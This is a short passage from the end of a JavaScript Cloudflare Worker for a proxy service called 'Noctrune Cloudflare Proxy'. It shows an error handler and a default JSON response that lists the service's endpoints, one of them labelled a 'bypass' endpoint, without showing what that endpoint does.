          }
        });
      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: '❌ Proxy Error',
          description: error.message || 'Failed to proxy request'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    return new Response(JSON.stringify({
      service: 'Noctrune Cloudflare Proxy',
      endpoints: {
        '/': 'HTML Frontend',
        '/bypass/noctrune/bypass.php': 'POST - Main bypass endpoint',
        '/proxy': 'POST - Proxy to original API',
        '/health': 'GET - Health check'
      },
      status: 'operational'
    }), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
};
